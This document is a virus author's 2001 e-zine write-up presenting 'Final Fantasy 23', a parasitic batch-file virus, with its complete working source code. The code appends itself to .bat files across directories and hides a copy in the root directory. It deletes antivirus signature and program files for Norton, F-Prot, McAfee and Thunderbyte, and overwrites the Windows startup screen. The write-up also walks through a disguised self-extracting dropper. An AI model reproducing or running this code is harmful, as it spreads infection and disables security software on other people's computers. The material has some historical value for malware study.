This is my (PhileT0a$t3r) fifth virus, and we got middle of September 2001 right now. End of September "Pinoy Virus Writers E-Zine #6" is said to come out, and I hope, this one is getting in. If yes, then PVW#6 is the official release. This is now my third batch-virii. The idea was getting to me/us as I watched the cinema-movie "Final Fantasy - The Forces within you" (I think the name is like that in Englisch) together with dr.g0nZo und El DudErin0 (both [rRlf]). Besides we all think the movie completely sucks. The programers just wanted to show, what they can do with their cool computers, and with that, they forgot the story... Fuck it, what I write here does not interest someone anyway. ...The virus was done by two guys? Well, I have written it, and the payload comes from dr.g0nZo. Now this payload: As far as I know is "Final Fantasy 23 - The Forces in your Vacuum Cleaner" the first batch-virus with a colored payload, that does not use debug. And apart from that: 

bat-infector 
parasitic 
retro: F-Prot 95, McAfee, Thunderbyte, Norton AntiVirus 2000 (newest version, it does not recognize the virus, even if heuristic is at maximum) 
uses ".."-method to change directories 
copies itself as call-back to the root-directory 
payload: changes the start-up-screen 
fully compatible to Windows ME, Windows 98, Windows 95 (tested) 
size: 34.816 bytes (virus and payload); 1.155 bytes (the virus only) 
PhileT0a$t3r likes to gr33t: 3ri5, dr.g0nZo [rRlf], El DudErin0 [rRlf], Jimmy [rRlf], rastafarie [rRlf], pRe4Ch_0_23, Zoom23 [PVW], Necronomikon, SnakeByte, Senna Spy, Zarrmann, El Commandante, Sasi/Kia, m0m0, Funky Needles, fir3nz3 z00l, Mindjuice.

Well, and that is how this works: 

The "original"-virus has got the name: Final Fantasy 23 - The Forces in your Vacuum Cleaner.exe This is a selfextracting zip-archiv (thanks to WinZip and Phrozen Crew at this place). It contains the following files: 

ff23.com
ff23.exe
ff23.ico
ff23.sys

(You should not have it too easy, opening the files...) At executing, all files are extracted to a temporary folder, and ff23.com gets executed. This is a batch-file in a com-file (yes, I refuse using something other than batch, and I know it would be much easier and more effective using a "real" language, but I am a Dos-phreak, and I do not want to give that stuff up, as long as it still works). "bat2com" by Foley Hi-Tech Systems (thanks to them at this place) was used for this. Script of the original-batch-file of ff23.com: 


@echo off
ctty nul
ren ff23.ico pre.bat
call pre.bat
:end


As we see the file ff23.ico gets renamed to pre.bat and then executed. This one does the following: 

@echo off
ctty nul
move ff23.exe c:\
move ff23.sys c:\windows
ren c:\windows\ff23.sys ff23.bat
call c:\windows\ff23.bat
ctty con
:endpre

The file ff23.exe gets moved to the root-directory, and ff23.sys to c:\windows. The last one gets renamed to ff23.bat and then executed. And this is now the actual virus (which works too without all the stuff before, but then it carries no start-up-screen with it): 

@echo off%_ff23%
if '%1=='ff23 goto ff23%2
set ff23=%0.bat
if not exist %ff23% set ff23=%0
if '%ff23%==' set ff23=autoexec.bat
if exist c:\_ff23.bat goto ff23g
if not exist %ff23% goto eff23
find "ff23"c:\_ff23.bat
attrib c:\_ff23.bat +h
:ff23g
command /c c:\_ff23 ff23 vir
:eff23
ctty nul.ff23
:r3tr0ff23
if exist c:\_ff23.bat del c:\programme\norton~1\s32integ.dll
if exist c:\_ff23.bat del c:\programme\f-prot95\fpwm32.dll
if exist c:\_ff23.bat del c:\programme\mcafee\scan.dat
if exist c:\_ff23.bat del c:\tbavw95\tbscan.sig
:p4yl0adff23
if exist c:\windows\ff23.inf goto naff23
if not exist c:\windows\ff23.inf del c:\logo.sys
ren c:\ff23.exe logo.sys
echo>ff23.inf you are infected with "Final Fantasy 23 - The Forces in your Vacuum Cleaner" by PhileT0a$t3r [rRlf] & dr.g0nZo [rRlf]
move ff23.inf c:\windows
if exist c:\_ff23.bat ctty con
:naff23
set ff23=
goto ff23end
:ff23vir
for %%a in (*.bat ..\*.bat c:*.bat) do call c:\_ff23 ff23 i %%a
exit ff23
:ff23i
find "ff23"<%3>nul
if not errorlevel 1 goto ff23end
type %3>ff23$
echo.>>ff23$
type c:\_ff23.bat>>ff23$
move ff23$ %3>nul
exit ff23
:ff23end

The virus now has nothing special. It is doing what a virus should do. At the payload, it looks, if this has already been done. If yes, then the file c:\windows\ff23.inf does already exist, and the payload can be left out. Has this not been done yet, the original start-up-screen is deleted and the ff23.exe (a bitmap) gets renamed to logo.sys, the new start-up-screen. Then the file c:\windows\ff23.inf is built. If the virus is executed without the other stuff, the payload is just deleting the start-up-screen and building the file c:\windows\ff23.inf (which contains our nice message).
